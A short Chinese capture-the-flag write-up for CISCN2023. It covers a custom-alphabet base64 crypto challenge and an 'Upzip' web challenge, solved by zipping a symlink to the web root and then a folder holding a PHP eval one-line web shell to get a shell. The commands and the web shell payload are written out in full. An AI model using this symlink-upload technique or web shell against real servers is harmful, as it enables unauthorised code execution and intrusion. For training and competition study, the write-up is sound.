### CISCN2023

#### CRYPTO

##### sign_in_passwd

```
j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D
GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5
```

题目提供了换表的base64（下面一行），用cyberchef填进去对上面一行的内容解码即可。

#### WEB

##### Upzip

一道软链接攻击的题目，随便传一个文件会发现它对文件MIME进行检查，并把压缩包里的文件解压到tmp文件夹下，但是tmp文件夹我们并没有访问权限，考虑使用软链接攻击：

1. 先在一个新文件夹下创建一个软链接，链接到Apache服务器的网页目录下，对它进行压缩

   ```shell
   mkdir unzip
   cd unzip
   ln -s /var/www/html mylink
   zip -y link.zip mylink
   ```

2. 创建一个同名文件夹，这样这个压缩包上传后，解压目标目录下已经存在这个文件夹，就会把解压的文件直接放到这个文件夹。

   ```shell
   mkdir mylink
   echo "<?php eval(\$_POST['a']);?>" > mylink/1.php		// 使用\对 $ 进行转译
   zip -r shell.zip mylink
   ```

3. 首先上传link.zip，/tmp目录下就会有一个叫mylink的软链接。再次上传shell.zip，解压后应该得到一个叫mylink的文件夹，但由于存在同名文件夹，就会把文件夹中的文件直接放到原文件夹下，而原文件夹指向了/var/www/html，所以1.php就被放到了网页根目录下，直接访问1.php即可通过一句话木马getshell。